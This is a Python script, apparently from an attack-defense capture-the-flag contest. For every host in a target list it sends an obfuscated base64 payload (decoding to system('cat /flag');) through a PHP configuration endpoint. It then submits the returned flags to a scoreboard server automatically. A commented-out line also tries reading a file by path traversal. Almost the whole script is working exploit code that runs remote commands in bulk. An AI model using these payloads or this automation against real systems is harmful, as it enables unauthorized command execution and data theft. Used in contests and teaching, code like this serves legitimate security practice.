import json
import requests


def submitflag(gameid, teamId, userId, flag):
    url = "http://192.168.1.31/submitFlags"
    flag=flag.strip()
    data = {"matchId": gameid, "teamId": teamId, "userId": userId, "answer": flag}
    requests.post(url, data=json.dumps(data))
    requests.post(url, data) # =json.dumps(data))


# 比赛ID
gameid = "VmEK8aWQTwWUswf-MksxXA"
# 战队ID
teamId = "QH1wg19yTom9EzN8MMspoA"
# 用户ID
userId = "V2j-jJ_iTeCcLczt_mYGpQ"

headers = {
        # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
        "Cookie": "security=high; PHPSESSID=5c6sgq0cclaer2tdpi6iep1m62"
    }

with open('flags.txt', 'w') as flags:
    for ip in open('targets.txt', 'r'):
        ip = ip.strip()
        urls = ['http://%s/admin/inc/configuration.php?getconfig=c3lzdGVtKCdjYXQgL2ZsYWcnKTs=' % ip
           ]
    # ['http://%s/admin/download.php?file=/flag' % ip,
        try:
            for url in urls:
                print(url)
                resp = requests.get(url, timeout=5)
                print(ip)
                print('#' * 50)
                flag = resp.content.decode("utf-8")
                print(flag)
                submitflag(gameid, teamId, userId, flag.strip())
                flags.writelines(flag)
        except requests.exceptions.ConnectionError:
            pass



    '''
    url = 'http://%s/admin/inc/configuration.php?getconfig=c3lzdGVtKCdjYXQgL2ZsYWcnKTs=' % ip.strip()
    print(url)
    resp = requests.get(url)
    print(ip.strip())
    print('#' * 50)
    print(resp.content)

    flag = str(resp.content)
    '''

    # submitflag(gameid, teamId, userId, flag)